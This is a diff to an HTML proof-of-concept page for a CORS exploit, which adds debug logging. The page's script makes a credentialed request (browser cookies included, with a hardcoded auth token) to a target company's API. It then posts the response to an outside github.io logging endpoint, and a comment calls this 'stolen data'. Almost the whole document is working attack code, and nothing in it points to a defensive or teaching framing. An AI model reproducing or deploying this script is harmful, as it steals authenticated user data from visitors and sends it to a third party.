@@ -1,9 +1,10 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CORS Exploit</title>
+    <title>CORS Exploit Debug</title>
     <script>
-        // Malicious script to send authenticated request and steal sensitive data
+        console.log("Exploit script loaded.");
+
         fetch("https://api.company-target.com/api/v3/ip.json?referrer=&page=https%3A%2F%2Fevgen.appsflyer.com%2F%3Furl%3Dgoogle.com&page_title=In-app%20event%20generator", {
             method: "POST",
             credentials: "include", // Include cookies for the request
@@ -16,9 +17,13 @@
                 "auth": "mHlqHytbs5xRhLbSvPSKl4PqNQJrYCYgov6cXimN"
             })
         })
-        .then(response => response.text())
+        .then(response => {
+            console.log("Response received:", response);
+            return response.text();
+        })
         .then(data => {
-            // Exfiltrate the response
+            console.log("Data extracted:", data);
+            // Send stolen data to your server
             fetch("https://varad4-0-4.github.io/covid19partnersplatform-dev/log", {
                 method: "POST",
                 headers: {
@@ -31,9 +36,10 @@
     </script>
 </head>
 <body>
-    <h1>Loading...</h1>
+    <h1>Loading Exploit...</h1>
 </body>
 </html>
+
 
 
 <!-- <!DOCTYPE html>
